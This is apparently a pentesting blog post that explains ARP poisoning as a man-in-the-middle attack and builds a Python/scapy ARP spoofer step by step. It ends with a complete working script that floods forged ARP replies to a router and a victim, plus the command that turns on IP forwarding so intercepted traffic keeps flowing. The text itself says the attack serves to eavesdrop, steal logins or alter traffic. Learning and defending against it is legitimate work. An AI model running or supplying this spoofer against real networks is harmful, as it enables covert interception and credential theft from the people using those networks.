---
title: Writing an ARP spoofer using python
date: 2020-12-17 13:56:24 GMT+2
categories: [Development, Pentesting Tools]
tags: [ethical hacking, python]     # TAG names should always be lowercase
image: /assets/img/posts/arpspoofer/arpspoofer.png
---

## What is Address Resolution Protocol (ARP) ?
Simple protocol used to map IP address of a machine to its MAC address, and vice versa.

## What is ARP spoofing ?
An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between two parties either to secretly eavesdrop or modify traffic traveling between the two. Attackers might use MitM attacks to steal login credentials or personal information, spy on the victim, or sabotage communications or corrupt data. The attack works as follows:
1. The attacker try to gain access to the network, then scan the network to find the IP addresses of his victims. For example the IP address of PC and router.
2. The attacker uses any spoofing tool (such as arpspoof) to send out forged ARP responses. 
3. The forged responses trick the PC by sending the attacker's MAC address as the router's MAC address, and trick the router by sending the attacker's MAC address as the PC's MAC address. This fools both router and PC to connect to the attacker’s machine, instead of to each other.
4. The two devices update their ARP cache entries. After that, the communication is going through the attacker machine instead of directly with each other.
5. The attacker is now secretly in the middle of all communications.

![MitM](/assets/img/posts/arpspoofer/mitm.jpg)

## Writing the script

### Step 1: Importing required modules

* scapy: is a powerful Python-based interactive packet manipulation program and library. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, store or read them using pcap files, match requests and replies, and much more.
* sys: Lets us access system-specific parameters and functions.
* time: provides many ways of representing time in code. It also provides functionality other than representing time, like waiting during code execution and measuring the efficiency of your code.

```python
# Python code snippet
import scapy.all as scapy
import sys
import time
```

### step 2: Asking user for required arguments

We ask user to enter router ip and target ip as first and second command arguments respectively. Then we get the MAC address of both by calling get_mac_address function that we will implement later.

```python
# Python code snippet
router_ip = str(sys.argv[1])
target_ip = str(sys.argv[2])
router_mac = str(get_mac_address(router_ip))
target_mac = str(get_mac_address(target_ip))
```

### step 2: Implementing required functions

### get_mac_address() function

get_mac_address function takes one parameter "ip_address". We use this function to create our packet that consists of Ether layer takes destination broadcast MAC address 'ff:ff:ff:ff:ff:ff' and ARP layer takes the IP address of either target or router. Then we combine the two layers together to get our final packet. We use scapy.srp() function to send our packet. This function returns a list that contains answers and unanswers, so we put at the end index zero to select the first element which is answers. Then we return the MAC address of the specified IP address. The answer variable has a bunch of lists, so we need to set that we want the first list "[0]" that contains our packet then from this list we want the response that have the MAC address of our target/router "[1].hwsrc".

```python
def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc
```

### spoof() function

spoof function takes four parameters "router_ip", "target_ip, "router_mac", and "target_mac". This function is reponsible of spoofing by sending ARP response packet1 to the router as it comes from the target (for example, regular user on the network) and sending ARP response packet2 to the target as it comes from the router.
>**Note:** in the scapy.ARP() function, op=2 for ARP response and op=1 for ARP request.

```python
# Python code snippet
def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)
```

### Step3: Calling spoof() function

We launch an infinite while loop and call the spoof function to send packet1 and packet2 then we sleep 2 seconds between each packet that we sent. We handle the exception of KeyboardInterrupt, so we can terminate the program safely.

```python
# Python code snippet
try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)
```

## The complete script

After assembling all the steps together, here is the final complete script.

>**Note:** before running the program, we need to enable packet forwarding to forward packets from one target to another. So we run this command first in our terminal.
```bash
echo 1 >> /proc/sys/net/ipv4/ip_forward
```

```python
import scapy.all as scapy
import sys
import time

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)
```
